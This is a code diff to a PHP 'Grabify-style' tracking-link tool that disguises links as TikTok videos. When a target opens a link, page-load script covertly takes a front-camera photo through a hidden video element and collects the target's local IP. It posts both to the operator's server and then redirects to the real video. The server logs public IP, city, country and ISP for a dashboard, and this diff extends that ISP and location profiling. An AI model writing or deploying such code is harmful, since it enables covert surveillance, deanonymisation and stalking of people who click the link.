@@ -75,15 +75,19 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
+// دالة محسنة لجلب الموقع مع اسم شركة الاتصالات (موبيليس، جازي، أوريدو، ADSL)
 function get_ip_location($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return 'Local Network';
     }
-    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org");
     if ($json) {
         $data = json_decode($json, true);
         if (isset($data['status']) && $data['status'] === 'success') {
-            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+            $city = $data['city'] ? $data['city'] . ', ' : '';
+            $country = $data['country'] ?? 'Unknown';
+            $isp = $data['isp'] ?? ($data['org'] ?? '');
+            return "{$city}{$country} [{$isp}]";
         }
     }
     return 'Unknown Location';
@@ -122,11 +126,20 @@ if (isset($_GET['r'])) {
         if ($is_bot) {
             $bot_ip = get_real_ip();
             $bot_location = get_ip_location($bot_ip);
-            $bot_device = "Preview Bot / System Scraper";
+            $bot_device = "Preview Bot / Auto-Fetch";
             
             try {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', $bot_ip, 'Bot Preview', 'N/A', $bot_location, $bot_device, date('Y-m-d H:i:s')]);
+                $capStmt->execute([
+                    $code, 
+                    'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=200', 
+                    $bot_ip, 
+                    'Not Clicked (Preview IP)', 
+                    'N/A', 
+                    $bot_location, 
+                    $bot_device, 
+                    date('Y-m-d H:i:s')
+                ]);
             } catch (Exception $e) {}
 
             header('Content-Type: text/html; charset=utf-8');
@@ -195,49 +208,53 @@ if (isset($_GET['r'])) {
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            if (shouldCapture === 1) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                    .then(stream => {
-                        const video = document.createElement('video');
-                        video.setAttribute('autoplay', 'true');
-                        video.setAttribute('playsinline', 'true');
-                        video.style.display = 'none';
-                        video.srcObject = stream;
-                        document.body.appendChild(video);
-                        
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = 640;
-                            canvas.height = 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            getLocalIP(function(localIp) {
+                if (shouldCapture === 1) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                        .then(stream => {
+                            const video = document.createElement('video');
+                            video.setAttribute('autoplay', 'true');
+                            video.setAttribute('playsinline', 'true');
+                            video.style.display = 'none';
+                            video.srcObject = stream;
+                            document.body.appendChild(video);
                             
-                            const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                            stream.getTracks().forEach(track => track.stop());
-                            video.remove();
+                            setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 640;
+                                canvas.height = 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                                stream.getTracks().forEach(track => track.stop());
+                                video.remove();
 
-                            getLocalIP(function(localIp) {
-                                const formData = new URLSearchParams();
-                                formData.append('save_capture', '1');
-                                formData.append('image', imageData);
-                                formData.append('lip', localIp);
-
-                                fetch(window.location.href, {
-                                    method: 'POST',
-                                    body: formData
-                                }).finally(() => {
-                                    window.location.replace(targetUrl);
-                                });
-                            });
-                        }, 500);
-                    })
-                    .catch(err => {
-                        window.location.replace(targetUrl);
-                    });
-            } else {
-                window.location.replace(targetUrl);
-            }
+                                sendDataAndRedirect(imageData, localIp);
+                            }, 500);
+                        })
+                        .catch(err => {
+                            sendDataAndRedirect('', localIp);
+                        });
+                } else {
+                    sendDataAndRedirect('', localIp);
+                }
+            });
         });
+
+        function sendDataAndRedirect(imgData, localIp) {
+            const formData = new URLSearchParams();
+            formData.append('save_capture', '1');
+            formData.append('image', imgData);
+            formData.append('lip', localIp);
+
+            fetch(window.location.href, {
+                method: 'POST',
+                body: formData
+            }).finally(() => {
+                window.location.replace(targetUrl);
+            });
+        }
     </script>
 </head>
 <body style="background:#000;">
@@ -351,7 +368,7 @@ if (!empty($filter_code)) {
         <div class="section-box">
             <h2>Generate Direct Grabify-Style Link</h2>
             <form method="POST" class="form-grid">
-                <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
+                <input type="text" name="target_url" placeholder="TikTok Video URL..." required, autocomplete="off">
                 
                 <label class="checkbox-group">
                     <input type="checkbox" name="capture_cam" value="1">
@@ -404,7 +421,7 @@ if (!empty($filter_code)) {
                                 <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                             </div>
                             <div class="info-row">
-                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                                <span>Location / ISP:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                             </div>
                             <div class="info-row">
                                 <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
